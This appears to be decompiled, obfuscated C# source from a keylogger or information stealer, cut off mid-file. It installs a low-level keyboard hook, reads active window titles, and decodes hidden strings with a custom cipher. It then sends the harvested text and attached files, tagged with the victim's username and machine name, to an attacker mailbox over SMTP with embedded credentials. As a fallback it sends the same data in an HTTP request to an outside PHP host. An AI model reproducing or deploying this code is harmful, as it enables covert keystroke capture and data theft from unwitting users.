			string text = Class6.string_0.ToString() + Environment.NewLine + Environment.NewLine + Class6.string_1 + Environment.NewLine + Environment.NewLine + Class6.string_2 + Environment.NewLine + Environment.NewLine + Class6.string_3 + Environment.NewLine + Environment.NewLine + Class6.string_4 + Environment.NewLine + Environment.NewLine + Class6.string_5 + Environment.NewLine + Environment.NewLine + Class6.string_6 + Environment.NewLine + Environment.NewLine + Class6.string_7 + Environment.NewLine + Environment.NewLine + Class6.string_8 + Environment.NewLine + Environment.NewLine + Class6.string_9 + Environment.NewLine + Environment.NewLine + Class6.string_10 + Environment.NewLine + Environment.NewLine + Class6.string_11;
			if (!((Operators.CompareString(text, (string)null, false) != 0) | (Operators.CompareString(text, (string)null, false) != 0)))
			{
				return;
			}
			try
			{
				MailMessage mailMessage = new MailMessage();
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.From = new MailAddress(Class6.string_13);
				mailMessage2.To.Add(Class6.string_13);
				mailMessage2.Subject = Class5.smethod_38("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + Class5.smethod_38("aQ0=", Class5.smethod_38("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
				mailMessage2.Body = text;
				try
				{
					FileInfo[] array = files;
					foreach (FileInfo fileInfo in array)
					{
						Attachment item = new Attachment(fileInfo.FullName);
						mailMessage2.Attachments.Add(item);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				mailMessage2 = null;
				SmtpClient smtpClient = new SmtpClient(Class6.string_15);
				SmtpClient smtpClient2 = smtpClient;
				smtpClient2.Port = Class6.int_1;
				smtpClient2.EnableSsl = true;
				smtpClient2.Credentials = new NetworkCredential(Class6.string_13, Class6.string_14);
				smtpClient2.Send(mailMessage);
				smtpClient2 = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string text2 = "http://limitlessrecoded.3owl.com/RecodedMail.php";
					_ = (HttpWebResponse)WebRequest.Create(text2 + "?to=" + Class6.string_13 + "&subject=" + Strings.Replace(Class5.smethod_38("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + Class5.smethod_38("aQ0=", Class5.smethod_38("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(text, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + Class6.string_13).GetResponse();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_36(Class16 class16_0)
	{
		class16_0.type_0.GetMethod("Clear")!.Invoke(class16_0.object_0, new object[0]);
	}

	static void smethod_37()
	{
		try
		{
			Class9.delegate0_0 = Class5.smethod_10;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class9.intptr_0 = (IntPtr)Class5.SetWindowsHookExA(13, Class9.delegate0_0, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	static string smethod_38(string string_0, string string_1)
	{
		try
		{
			Encoding uTF = Encoding.UTF8;
			byte[] byte_ = Convert.FromBase64String(string_0);
			byte[] bytes = Encoding.UTF8.GetBytes(string_1);
			return uTF.GetString(Class5.smethod_45(bytes, byte_));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	static int smethod_39(Class17.Stream0 stream0_0)
	{
		return Class5.smethod_27(stream0_0) | (Class5.smethod_27(stream0_0) << 16);
	}

	static int smethod_40(Class17.Class20 class20_0)
	{
		return 32768 - class20_0.int_1;
	}

	static void smethod_41(Class17.Class20 class20_0, int int_0)
	{
		if (class20_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class20_0.byte_0[class20_0.int_0++] = (byte)int_0;
		class20_0.int_0 &= 32767;
	}

	static int smethod_42(byte[] byte_0, int int_0, Class17.Class18 class18_0, int int_1)
	{
		int num = 0;
		do
		{
			if (class18_0.int_4 != 11)
			{
				int num2 = Class5.smethod_47(int_0, byte_0, int_1, class18_0.class20_0);
				int_0 += num2;
				num += num2;
				int_1 -= num2;
				if (int_1 == 0)
				{
					return num;
				}
			}
		}
		while (Class5.smethod_34(class18_0) || (class18_0.class20_0.int_1 > 0 && class18_0.int_4 != 11));
		return num;
	}

	static void smethod_43()
	{
	}

	static Class17.Class21 smethod_44(Class17.Class22 class22_0)
	{
		byte[] array = new byte[class22_0.int_3];
		Array.Copy(class22_0.byte_1, 0, array, 0, class22_0.int_3);
		return new Class17.Class21(array);
	}

	static byte[] smethod_45(byte[] byte_0, byte[] byte_1)
	{
		checked
		{
			int num = byte_1[byte_1.Length - 1];
			byte[] array = new byte[byte_1.Length - 2 + 1];
			short num2 = 0;
			try
			{
				int num3 = byte_1.Length - 2;
				for (int i = 0; i <= num3; i++)
				{
					if (num2 >= byte_0.Length)
					{
						num2 = 0;
					}
					if (i < byte_1.Length - 1)
					{
						array[i] = Convert.ToByte(unchecked((int)byte_1[i]) - unchecked(array.Length % byte_0.Length) - unchecked((int)byte_0[num2]) + num);
						num2 = (short)(num2 + 1);
					}
				}
				return array;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				byte[] result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	static bool smethod_46(Class17.Class22 class22_0, Class17.Class19 class19_0)
	{
		while (true)
		{
			switch (class22_0.int_2)
			{
			case 5:
			{
				int int_ = Class17.Class22.int_1[class22_0.int_7];
				int num = Class5.smethod_3(class19_0, int_);
				if (num >= 0)
				{
					Class5.smethod_20(class19_0, int_);
					num += Class17.Class22.int_0[class22_0.int_7];
					while (num-- > 0)
					{
						class22_0.byte_1[class22_0.int_8++] = class22_0.byte_2;
					}
					if (class22_0.int_8 == class22_0.int_6)
					{
						return true;
					}
					goto IL_009b;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class5.smethod_16(class22_0.class21_0, class19_0)) & -16) == 0)
				{
					class22_0.byte_1[class22_0.int_8++] = (class22_0.byte_2 = (byte)num2);
					if (class22_0.int_8 == class22_0.int_6)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class22_0.byte_2 = 0;
					}
					class22_0.int_7 = num2 - 16;
					class22_0.int_2 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class22_0.int_8 < class22_0.int_5)
				{
					int num3 = Class5.smethod_3(class19_0, 3);
					if (num3 >= 0)
					{
						Class5.smethod_20(class19_0, 3);
						class22_0.byte_0[Class17.Class22.int_9[class22_0.int_8]] = (byte)num3;
						class22_0.int_8++;
						continue;
					}
					return false;
				}
				class22_0.class21_0 = new Class17.Class21(class22_0.byte_0);
				class22_0.byte_0 = null;
				class22_0.int_8 = 0;
				class22_0.int_2 = 4;
				goto case 4;
			case 2:
				class22_0.int_5 = Class5.smethod_3(class19_0, 4);
				if (class22_0.int_5 >= 0)
				{
					class22_0.int_5 += 4;
					Class5.smethod_20(class19_0, 4);
					class22_0.byte_0 = new byte[19];
					class22_0.int_8 = 0;
					class22_0.int_2 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class22_0.int_4 = Class5.smethod_3(class19_0, 5);
				if (class22_0.int_4 >= 0)
				{
					class22_0.int_4++;
					Class5.smethod_20(class19_0, 5);
					class22_0.int_6 = class22_0.int_3 + class22_0.int_4;
					class22_0.byte_1 = new byte[class22_0.int_6];
					class22_0.int_2 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class22_0.int_3 = Class5.smethod_3(class19_0, 5);
				if (class22_0.int_3 >= 0)
				{
					class22_0.int_3 += 257;
					Class5.smethod_20(class19_0, 5);
					class22_0.int_2 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_009b:
			class22_0.int_2 = 4;
		}
	}

	static int smethod_47(int int_0, byte[] byte_0, int int_1, Class17.Class20 class20_0)
	{
		int num = class20_0.int_0;
		if (int_1 > class20_0.int_1)
		{
			int_1 = class20_0.int_1;
		}
		else
		{
			num = (class20_0.int_0 - class20_0.int_1 + int_1) & 0x7FFF;
		}
		int num2 = int_1;
		int num3 = int_1 - num;
		if (num3 > 0)
		{
			Array.Copy(class20_0.byte_0, 32768 - num3, byte_0, int_0, num3);
			int_0 += num3;
			int_1 = num;
		}
		Array.Copy(class20_0.byte_0, num - int_1, byte_0, int_0, int_1);
		class20_0.int_1 -= num2;
		if (class20_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return num2;
	}

	static void smethod_48()
	{
	}

	static int smethod_49(Class17.Class19 class19_0)
	{
		return class19_0.int_2;
	}

	static string smethod_50(IntPtr intptr_0)
	{
		try
		{
			if (intptr_0.ToInt32() <= 0)
			{
				return null;
			}
			int windowTextLength = Class5.GetWindowTextLength(intptr_0);
			if (windowTextLength == 0)
			{
				return null;
			}
			StringBuilder stringBuilder = new StringBuilder(checked(windowTextLength + 1));
			Class5.GetWindowTextA((int)intptr_0, stringBuilder, stringBuilder.Capacity);
			return stringBuilder.ToString().Trim();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	static void smethod_51()
	{
	}
}
